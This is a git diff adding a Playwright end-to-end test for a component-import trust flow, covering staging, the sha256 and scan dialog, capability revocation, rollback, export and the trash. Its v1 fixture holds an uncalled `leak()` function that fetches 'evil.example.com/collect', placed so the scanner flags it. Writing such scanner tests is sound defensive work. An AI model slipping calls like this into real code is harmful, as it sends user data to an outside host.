@@ -19,11 +19,13 @@
 // 出现在侧栏“运行中”；错误卡 [让代理修复] 带错误摘要；“空白 + 描述”新建后交给代理生成。
 // 浏览器模拟不等于 Tauri / WebView2 或真机验证。
 import assert from 'node:assert/strict'
+import { createHash } from 'node:crypto'
 import { existsSync } from 'node:fs'
 import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { dirname, join, resolve } from 'node:path'
 import { fileURLToPath } from 'node:url'
+import { strToU8, unzipSync, zipSync } from 'fflate'
 import { chromium } from 'playwright-core'
 import {
   BOARD_SESSION_ID,
@@ -974,6 +976,220 @@ try {
       .catch(() => {})
   await agentPage.waitForTimeout(3_500)
   await agentContext.close()
+
+  // 14. A8 信任与生命周期：导入暂存 → 信任确认（扫描、sha256）→ 台账与撤销 → 替换导入（diff）→
+  // 崩溃的错误卡 [回滚到 v1] → 版本对比 → 导出 ZIP → 删除进回收站并恢复 → 待确认导入的取消与丢弃。
+  const sharedManifest = (version) => ({
+    runtime: 'native',
+    sdk: 1,
+    name: '分享卡片',
+    version,
+    placements: [{ surface: 'overview-card', sizes: ['S', 'M'] }, { surface: 'feature-page' }],
+    capabilities: {
+      network: { hosts: ['api.github.com'], reason: '读取构建状态' },
+      storage: { quotaKb: 16, reason: '记住上次查看' },
+    },
+  })
+  // v1：挂载时写一次存储（台账里应出现“存储 · 今天 1 次”）；源码里留一处没调用的直连 fetch，扫描应标红。
+  const sharedV1 = [
+    'export default function SharedCard({ ctx }) {',
+    '  const { React, html } = ctx',
+    "  React.useEffect(() => { ctx.storage.set('seen', 1).catch(() => {}) }, [])",
+    '  return html`<p data-fixture-shared="v1">分享卡片 v1</p>`',
+    '}',
+    '// 从没被调用：只是让静态扫描有东西可报。',
+    "export function leak() { return fetch('https://evil.example.com/collect') }",
+    '',
+  ].join('\n')
+  const sharedV2 = "export default function SharedCard() { throw new Error('v2 crash') }\n"
+  const sharedZip = (version, source) =>
+    Buffer.from(
+      zipSync({
+        'share/shared-card/manifest.json': strToU8(JSON.stringify(sharedManifest(version))),
+        'share/shared-card/component.js': strToU8(source),
+      }),
+    )
+  const zipV1 = sharedZip('1.0.0', sharedV1)
+  const zipV2 = sharedZip('1.1.0', sharedV2)
+  const lifeContext = await newContext({
+    viewport: { width: 1440, height: 900 },
+    acceptDownloads: true,
+  })
+  const life = await openPage(lifeContext, 'lifecycle', '#/components/native-ok')
+  await life.locator('[data-component-row="native-ok"]').waitFor({ timeout: 60_000 })
+  const upload = (buffer, name) =>
+    life
+      .locator('[data-component-import-input]')
+      .setInputFiles({ name, mimeType: 'application/zip', buffer })
+
+  await upload(zipV1, 'shared-card.zip')
+  const trustDialog = life.locator('[data-trust-dialog]')
+  await trustDialog.waitFor({ timeout: 30_000 })
+  await trustDialog.locator('[data-trust-source="component.js"]').waitFor({ timeout: 30_000 })
+  assert.match(
+    await trustDialog.locator('[data-trust-sha256]').textContent(),
+    new RegExp(createHash('sha256').update(zipV1).digest('hex')),
+  )
+  await trustDialog
+    .locator('[data-scan-finding="fetch"][data-severity="danger"]')
+    .waitFor({ timeout: 10_000 })
+  assert.equal(
+    await trustDialog.locator('[data-scan-host="evil.example.com"]').getAttribute('data-declared'),
+    'false',
+  )
+  // 暂存不等于安装：信任之前 custom-ui/ 里没有它。
+  assert.equal(existsSync(join(componentsRoot, 'shared-card')), false)
+  assert.equal(await noHorizontalScroll(life), true)
+  await life.screenshot({ path: join(output, 'trust-dialog-1440.png') })
+  await trustDialog.locator('[data-trust-confirm]').click()
+  await trustDialog.waitFor({ state: 'detached', timeout: 30_000 })
+  await life
+    .locator('[data-component-preview] [data-fixture-shared="v1"]')
+    .waitFor({ timeout: 30_000 })
+  assert.equal(
+    await life.locator('[data-component-row="shared-card"]').getAttribute('aria-current'),
+    'true',
+  )
+  report.checks.push(
+    'Import ZIP only stages: the trust dialog shows source, sha256 of the archive, the bare fetch flagged red and the undeclared host; nothing is installed until 信任并启用, after which it is selected and renders',
+  )
+
+  // 台账：挂载时那次 storage.set 由 Runtime 记下（最多等一轮 15 秒的补读）；撤销后存储被 Runtime 拒绝，恢复后放行。
+  const storageRow = life.locator('[data-component-capability="storage"]')
+  await life.waitForFunction(
+    () =>
+      /今天 1 次/.test(
+        document.querySelector('[data-component-capability="storage"] [data-capability-usage]')
+          ?.textContent ?? '',
+      ),
+    undefined,
+    { timeout: 30_000 },
+  )
+  await storageRow.locator('[data-capability-toggle="storage"]').click()
+  await life
+    .locator('[data-component-capability="storage"][data-capability-revoked]')
+    .waitFor({ timeout: 10_000 })
+  const revoked = await api(life, 'GET', '/api/custom-ui/components/shared-card/storage/seen')
+  assert.deepEqual([revoked.status, revoked.body.code], [403, 'component_capability_revoked'])
+  await storageRow.locator('[data-capability-toggle="storage"]').click()
+  await life
+    .locator('[data-component-capability="storage"]:not([data-capability-revoked])')
+    .waitFor({ timeout: 10_000 })
+  assert.equal(
+    (await api(life, 'GET', '/api/custom-ui/components/shared-card/storage/seen')).status,
+    200,
+  )
+  report.checks.push(
+    'Capability list shows the Runtime-recorded storage call (今天 1 次); 撤销 makes the Runtime refuse storage with component_capability_revoked, 恢复 allows it again',
+  )
+
+  // 替换导入：确认表写明会替换已安装版本，内嵌 diff；信任后 v2 崩溃，错误卡给出 [回滚到 v1]。
+  await upload(zipV2, 'shared-card-1.1.zip')
+  await trustDialog.waitFor({ timeout: 30_000 })
+  await trustDialog.locator('[data-trust-replaces]').waitFor({ timeout: 30_000 })
+  await trustDialog.locator('[data-trust-diff]').click()
+  // diff 查看器是懒加载的：等它把内容画出来再读。
+  await life.waitForFunction(
+    () => /v2 crash/.test(document.querySelector('[data-trust-diff-view]')?.textContent ?? ''),
+    undefined,
+    { timeout: 30_000 },
+  )
+  await life.screenshot({ path: join(output, 'trust-replace-diff-1440.png') })
+  await trustDialog.locator('[data-trust-confirm]').click()
+  await trustDialog.waitFor({ state: 'detached', timeout: 30_000 })
+  const rollback = life.locator('[data-component-preview] [data-component-rollback="1"]')
+  await rollback.waitFor({ timeout: 30_000 })
+  await life.screenshot({ path: join(output, 'error-card-rollback-1440.png') })
+  await rollback.click()
+  await life
+    .locator('[data-component-preview] [data-fixture-shared="v1"]')
+    .waitFor({ timeout: 30_000 })
+  report.checks.push(
+    'Replacing import shows the installed-version diff inline; after trusting the crashing v2 the error card offers 回滚到 v1, which restores a working preview',
+  )
+
+  // 版本：当前是回滚生成的 v3，v2（导入）与 v1 都还在；[对比] 打开 v2 → 当前的 diff，Esc 关闭。
+  const current = life.locator('[data-version-current]')
+  await life
+    .locator('[data-version-current][data-component-version="3"]')
+    .waitFor({ timeout: 30_000 })
+  assert.match(await current.textContent(), /回滚/)
+  assert.deepEqual(
+    await life
+      .locator('[data-component-versions] [data-component-version]')
+      .evaluateAll((nodes) => nodes.map((node) => node.dataset.componentVersion)),
+    ['3', '2', '1'],
+  )
+  await life.locator('[data-version-compare="2"]').click()
+  const versionDiff = life.locator('[data-version-diff="2"]')
+  await versionDiff.waitFor({ timeout: 30_000 })
+  assert.match(await versionDiff.textContent(), /component\.js/)
+  await life.keyboard.press('Escape')
+  await versionDiff.waitFor({ state: 'detached', timeout: 10_000 })
+  report.checks.push(
+    'Versions list v3 当前 (回滚) · v2 · v1; 对比 opens the v2 → current diff in the session diff viewer and Esc closes it',
+  )
+
+  // 导出 ZIP：与导入同一布局，内容是当前（v1）的文件。
+  const [download] = await Promise.all([
+    life.waitForEvent('download'),
+    life.locator('[data-studio-settings] [data-component-export]').click(),
+  ])
+  assert.equal(download.suggestedFilename(), 'shared-card.zip')
+  const exported = unzipSync(new Uint8Array(await readFile(await download.path())))
+  assert.deepEqual(Object.keys(exported).sort(), [
+    'shared-card/component.js',
+    'shared-card/manifest.json',
+  ])
+  assert.match(Buffer.from(exported['shared-card/component.js']).toString('utf8'), /分享卡片 v1/)
+  report.checks.push(
+    '导出 ZIP downloads <id>/manifest.json + component.js with the current contents',
+  )
+
+  // 回收站：删除 → 回收站列出（7 天后清除；启动迁移来的旧组件“不自动清除”、不能恢复）→ 恢复。
+  await life.locator('[data-studio-settings] [data-component-more]').click()
+  await life.locator('[data-component-delete]').click()
+  await life.locator('[data-component-delete-confirm]').click()
+  await life
+    .locator('[data-component-row="shared-card"]')
+    .waitFor({ state: 'detached', timeout: 30_000 })
+  await life.locator('[data-component-trash]').click()
+  const trashDialog = life.locator('[data-trash-dialog]')
+  const sharedEntry = trashDialog.locator('[data-trash-entry^="shared-card-"]')
+  await sharedEntry.waitFor({ timeout: 30_000 })
+  assert.match(await sharedEntry.textContent(), /7 天后清除/)
+  const legacyEntry = trashDialog.locator('[data-trash-entry^="legacy-old-"]')
+  assert.match(await legacyEntry.textContent(), /不自动清除/)
+  assert.equal(await legacyEntry.locator('[data-trash-restore]').count(), 0)
+  await life.screenshot({ path: join(output, 'trash-1440.png') })
+  await sharedEntry.locator('[data-trash-restore]').click()
+  await trashDialog.waitFor({ state: 'detached', timeout: 30_000 })
+  await life
+    .locator('[data-component-preview] [data-fixture-shared="v1"]')
+    .waitFor({ timeout: 30_000 })
+  report.checks.push(
+    'Deleting moves the component to the trash (7 天后清除); legacy components moved at startup are listed as 不自动清除 without 恢复; 恢复 brings the component back and selects it',
+  )
+
+  // 待确认导入：[取消] 只关掉，组件库里留一行琥珀虚线框，“需处理”计入；从那一行重新打开后 [丢弃]。
+  await upload(zipV1, 'again.zip')
+  await trustDialog.waitFor({ timeout: 30_000 })
+  await trustDialog.getByRole('button', { name: '取消', exact: true }).click()
+  await trustDialog.waitFor({ state: 'detached', timeout: 10_000 })
+  const stagedRow = life.locator('[data-staged-row]')
+  await stagedRow.waitFor({ timeout: 30_000 })
+  assert.match(await stagedRow.textContent(), /again\.zip/)
+  await life.screenshot({ path: join(output, 'staged-row-1440.png') })
+  await stagedRow.locator('[data-staged-review]').click()
+  await trustDialog.waitFor({ timeout: 30_000 })
+  await trustDialog.locator('[data-trust-discard]').click()
+  await stagedRow.waitFor({ state: 'detached', timeout: 30_000 })
+  assert.deepEqual((await api(life, 'GET', '/api/custom-ui/components')).body.staged, [])
+  report.checks.push(
+    'A cancelled import stays as an amber dashed 待确认导入 row; reopening it and 丢弃 removes the staged archive',
+  )
+  await life.waitForTimeout(3_500)
+  await lifeContext.close()
 
   assert.deepEqual(report.pageErrors, [])
   report.status = 'passed'
